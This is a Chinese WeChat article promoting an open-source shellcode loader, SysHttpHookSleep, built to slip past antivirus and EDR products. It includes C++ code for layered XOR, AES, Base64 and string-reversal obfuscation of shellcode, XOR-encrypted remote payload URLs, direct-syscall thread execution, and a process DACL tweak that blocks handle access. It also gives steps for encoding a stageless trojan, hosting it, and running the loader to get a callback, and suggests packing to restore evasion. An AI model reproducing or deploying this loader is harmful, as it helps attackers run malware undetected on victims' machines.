#  内存规避Shellcodeloader

原创 Wangfly  [ SafeTime ](javascript:void\(0\);)

**SafeTime** ![]()

微信号 safetm

功能介绍 分享安全实践经验

____

___发表于_

收录于合集

#对抗 1 个

#内网渗透 2 个

![](https://gitee.com/fuli009/images/raw/master/public/20230714174856.png)

点击上方蓝字关注我们

  
![](https://gitee.com/fuli009/images/raw/master/public/20230714174857.png)\

# SysHttpHookSleep

https://github.com/wangfly-me/SysHttpHookSleep

## 代码来源

集合多种方式的ShellcodeLoader，主要代码来自：

https://github.com/mgeeky/ShellcodeFluctuation

https://github.com/TheD1rkMtr/BlockOpenHandle

## 主要功能

 **Shellcode：** 异或xor加密+Base64编码+AES加密+Base64编码+字符串反转。  

 **加载方式：** URL加密+远程加载+Syswhispers上线。  

 **内存规避：** HOOK Sleep函数+内存xor加密+System权限打开句柄。  

 **反虚拟机：** 注册表+文件+进程+内存。

## 原理浅析

Shellcode加密，采取`异或xor加密+Base64编码+AES加密+Base64编码+字符串反转`。

#### 异或xor加密

可改进，动态key生成

    
    
    const char* xx = rest2_decoded.c_str();  
      
    std::vector<uint8_t> sc;  
      
    for (int j = 0; j < rest2_decoded.length(); j++)  
    {  
        sc.push_back(xx[j] ^ XK2 ^ XK1);  
    }

#### 字符反转

    
    
    reverse(rest2_reference.begin(), rest2_reference.end());

AES和Base64，都有写好的，下载下来，直接用即可。https://github.com/kkAyataka/plusaes

#### URL加密

主要是避免静态特征，加密解密程序如下：

    
    
    int key[] = { 1,2,3,4,5,6,7 };  
      
    void encryption(string& c, int key[]) {  
        int len = c.size();  
        for (int i = 0; i < len; i++) {  
            c[i] = c[i] ^ key[i % 7];  
        }  
    }  
    void decode(string& c, int key[]) {  
        int len = c.size();  
        for (int i = 0; i < len; i++) {  
            c[i] = c[i] ^ key[i % 7];  
        }  
    }

#### 远程线程注入

Syswhispers生成远程线程注入函数，代码如下（可改进，Unhook每个敏感函数，去掉EDR钩子）：

    
    
    bool iS(std::vector<uint8_t>& shellcode, HandlePtr& thread)  
    {  
        HANDLE hHostThread = INVALID_HANDLE_VALUE;  
        auto alloc = VirtualAlloc(NULL, shellcode.size() + 1, MEM_COMMIT, PAGE_READWRITE);  
      
        memcpy(alloc, shellcode.data(), shellcode.size());  
        DWORD old;  
        VirtualProtect(alloc, shellcode.size() + 1, Shellcode_Memory_Protection, &old);  
        shellcode.clear();  
        SIZE_T sDataSize = shellcode.size();  
        NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)alloc, NULL, FALSE, NULL, NULL, NULL, NULL);  
        NtWaitForMultipleObjects(1, &hHostThread, WaitAll, FALSE, NULL);  
        NtFreeVirtualMemory((HANDLE)-1, &alloc, &sDataSize, MEM_RELEASE);  
        return 0;  
    }

#### 内存规避

https://www.freebuf.com/articles/system/361161.html

#### System权限打开句柄

    
    
    void Set()   
    {  
        LPCWSTR sddl = L"D:P"  
            L"(D;OICI;GA;;;WD)"    
            L"(A;OICI;GA;;;SY)"    
            L"(A;OICI;GA;;;OW)";  
      
        PSECURITY_DESCRIPTOR securityDescriptor = nullptr;  
      
        if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, SDDL_REVISION_1, &securityDescriptor, nullptr))   
        {  
            return;  
        }  
      
        if (!SetKernelObjectSecurity(GetCurrentProcess(), DACL_SECURITY_INFORMATION, securityDescriptor))   
        {  
            return;  
        }  
      
        LocalFree(securityDescriptor);  
    }

## 操作步骤

 **加密编码工具在release中下载。**

先生成stagerless的raw木马，按顺序分别使用enc.py、AES_Shellcode.exe、rev.py生成b.txt文件，并将其部署在服务器端。![](https://gitee.com/fuli009/images/raw/master/public/20230714174858.png)

其次将URL使用URL_XOR.exe进行加密，并分成两段填入str1和str2参数中。![](https://gitee.com/fuli009/images/raw/master/public/20230714174859.png)

最后生成exe，运行上线。![](https://gitee.com/fuli009/images/raw/master/public/20230714174900.png)

## 免杀效果

由于在项目中已经投入使用一段时间，可能有些已经不免杀，可以尝试VMP加壳，或者修改代码二次开发，来规避杀软。

![](https://gitee.com/fuli009/images/raw/master/public/20230714174901.png)

  

 **——The  End——**  

![](https://gitee.com/fuli009/images/raw/master/public/20230714174903.png)

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

